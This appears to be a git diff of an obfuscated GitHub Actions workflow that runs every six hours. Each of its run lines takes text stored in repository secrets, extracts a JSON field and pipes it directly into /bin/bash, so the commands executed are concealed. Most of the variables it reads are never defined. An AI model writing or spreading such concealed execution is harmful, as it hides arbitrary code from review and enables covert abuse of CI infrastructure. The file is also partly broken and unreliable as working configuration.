@@ -1,8 +1,10 @@
 name: shizuniao3289
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 1/6 * * *'
+    - cron: '14 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,16 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: shizuniao3289
         env:
-          tjk71689: ${{ secrets.tjk71689 }}
+          oay9: ${{ secrets.oay9 }}
         run: |
-          echo $tjk71689 | jq -r .rlo7 | /bin/bash
-          echo $ytmj350 | jq -r .vygdp8237 | /bin/bash
-          echo $mff71 | jq -r .lhkdz08 | /bin/bash
-          echo $h6865 | jq -r .hohz72 | /bin/bash
-          echo $s25 | jq -r .h18012 | /bin/bash
-          echo $kktux14 | jq -r .p27 | /bin/bash
-          echo $w75 | jq -r .a01073 | /bin/bash
-          echo $zbfh44260 | jq -r .evne650 | /bin/bash
-          echo $brcx4391 | jq -r .o10 | /bin/bash
-          echo $s82771 | jq -r .nxxdp96316 | /bin/bash
+          echo $oay9 | jq -r .qa2 | /bin/bash
+          echo $lyw814 | jq -r .qyo9681 | /bin/bash
+          echo $zk651 | jq -r .alzhm598 | /bin/bash
+          echo $gb446 | jq -r .v86 | /bin/bash
+          echo $ijyw91 | jq -r .f52852 | /bin/bash
+          echo $cdygy30 | jq -r .vs38 | /bin/bash
 
